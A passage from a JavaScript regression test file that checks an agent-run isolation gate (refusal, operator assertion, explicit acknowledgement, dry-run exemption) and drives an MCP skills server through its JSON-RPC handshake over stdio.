    assert(refused.stderr.includes('REFUSED') && refused.stderr.includes('--isolation'), `the refusal must name the flag: ${refused.stderr.slice(-300)}`);
    assert(!existsSync(captureFile), 'a refused run must NOT spawn the agent');
    const refusedRecord = JSON.parse(readFileSync(join(isoTmp, 'r1', 'run-security.json'), 'utf8'));
    assert(refusedRecord.isolation === 'refused', `the refusal must be recorded: ${JSON.stringify(refusedRecord)}`);

    // 2. AN ASSERTION: proceeds (the stub spawns), records operator-supplied +
    //    UNVERIFIED, warns. The stub writes no report.json, so the run ends as
    //    a reportless failure (exit 1) - what is asserted is that the GATE
    //    passed: a spawn happened and no REFUSED was printed.
    const asserted = await driveBatch(['--isolation', 'docker', '--out', join(isoTmp, 'r2')]);
    assert(existsSync(captureFile), 'an asserted run must spawn the agent');
    assert(!asserted.stderr.includes('REFUSED'), `an asserted run must not be refused: ${asserted.stderr.slice(-200)}`);
    rmSync(captureFile);
    const okRecord = JSON.parse(readFileSync(join(isoTmp, 'r2', 'run-security.json'), 'utf8'));
    assert(
      okRecord.isolation === 'operator-supplied:docker' && okRecord.unverified === true,
      `the record must say operator-supplied and UNVERIFIED: ${JSON.stringify(okRecord)}`,
    );
    assert(asserted.stderr.includes('UNVERIFIED'), 'an asserted run must warn on stderr');

    // 3. THE EXPLICIT ACKNOWLEDGEMENT: proceeds, recorded as acknowledged-none.
    const acked = await driveBatch(['--i-know-this-is-unisolated', '--out', join(isoTmp, 'r3')]);
    assert(existsSync(captureFile), 'an acknowledged run must spawn the agent');
    assert(!acked.stderr.includes('REFUSED'), `an acknowledged run must not be refused: ${acked.stderr.slice(-200)}`);
    const ackRecord = JSON.parse(readFileSync(join(isoTmp, 'r3', 'run-security.json'), 'utf8'));
    assert(ackRecord.isolation === 'operator-acknowledged-none', `the acknowledgement must be recorded: ${JSON.stringify(ackRecord)}`);

    // 4. DRY-RUN EXEMPTION: spawns nothing, so no assertion is required.
    const dry = await driveBatch(['--dry-run', '--out', join(isoTmp, 'r4')]);
    assert(dry.status === 0, `a dry run must not require the assertion: ${dry.status} ${dry.stderr.slice(-200)}`);
  } finally {
    rmSync(isoTmp, { recursive: true, force: true });
  }
}

// The MCP skills server (mcp/skills-server.mjs) is a production entry point
// registered into agent CLIs via .mcp.json and friends, and it had NO test
// (web-uplift-2ca): an SDK bump or edit could break the handshake silently.
// This drives the REAL server over stdio with the JSON-RPC handshake an MCP
// host performs: initialize -> serverInfo, prompts/list -> web-audit,
// resources/list -> skill://web-audit/SKILL.md, and a clean stderr.
async function testMcpSkillsServerStdio() {
  const child = spawn(process.execPath, [join(repoRoot, 'mcp', 'skills-server.mjs')], { stdio: ['pipe', 'pipe', 'pipe'] });
  let stderr = '';
  child.stderr.on('data', (d) => { stderr += d; });
  let buffer = '';
  let nextId = 1;
  const pending = new Map();
  child.stdout.on('data', (d) => {
    buffer += d;
    let i;
    while ((i = buffer.indexOf('\n')) >= 0) {
      const line = buffer.slice(0, i).trim();
      buffer = buffer.slice(i + 1);
      if (!line) continue;
      const msg = JSON.parse(line);
      if (msg.id !== undefined && pending.has(msg.id)) {
        pending.get(msg.id)(msg);
        pending.delete(msg.id);
      }
    }
  });
  const request = (method, params) =>
    new Promise((resolveReq, rejectReq) => {
      const id = nextId++;
      const timer = setTimeout(() => {
        if (pending.has(id)) {
          pending.delete(id);
          rejectReq(new Error(`MCP ${method}: no response within 10s`));
        }
      }, 10000);
      pending.set(id, (msg) => {
        clearTimeout(timer);
        resolveReq(msg);
      });
      child.stdin.write(JSON.stringify({ jsonrpc: '2.0', id, method, params }) + '\n');
    });
  try {
    const init = await request('initialize', {
      protocolVersion: '2024-11-05',
      capabilities: {},
      clientInfo: { name: 'web-uplift-regression', version: '0' },
    });
    assert(init.result?.serverInfo?.name === 'web-uplift', `initialize must name the server: ${JSON.stringify(init)}`);
    assert(init.result?.serverInfo?.version === '0.1.0', `initialize must carry the server version: ${JSON.stringify(init)}`);
    child.stdin.write(JSON.stringify({ jsonrpc: '2.0', method: 'notifications/initialized' }) + '\n');
    const prompts = await request('prompts/list', {});
    assert(
      prompts.result?.prompts?.some((p) => p.name === 'web-audit'),
      `prompts/list must carry the web-audit prompt: ${JSON.stringify(prompts)}`,
    );
    const resources = await request('resources/list', {});
    assert(
      resources.result?.resources?.some((r) => r.uri === 'skill://web-audit/SKILL.md'),
      `resources/list must carry the skill resource: ${JSON.stringify(resources)}`,
    );
    // Listing alone would pass even if the SKILL.md went missing; READ it.
    const read = await request('resources/read', { uri: 'skill://web-audit/SKILL.md' });
    const skillContent = read.result?.contents?.[0]?.text;
    assert(
      typeof skillContent === 'string' && skillContent.length > 1000 && skillContent.includes('web-uplift'),
      `resources/read must return the actual SKILL.md text, got: ${JSON.stringify(read ?? null).slice(0, 200)}`,
    );
    const got = await request('prompts/get', { name: 'web-audit', arguments: { url: 'https://example.com' } });
    const promptText = got.result?.messages?.[0]?.content?.text;
    assert(
      typeof promptText === 'string' && promptText.includes('https://example.com'),
      `prompts/get must render the skill with the url argument: ${JSON.stringify(got ?? null).slice(0, 200)}`,
    );
    assert(stderr.trim() === '', `the server must keep stderr clean through the handshake: ${stderr.slice(-300)}`);
  } finally {
    child.kill('SIGKILL');
  }
}






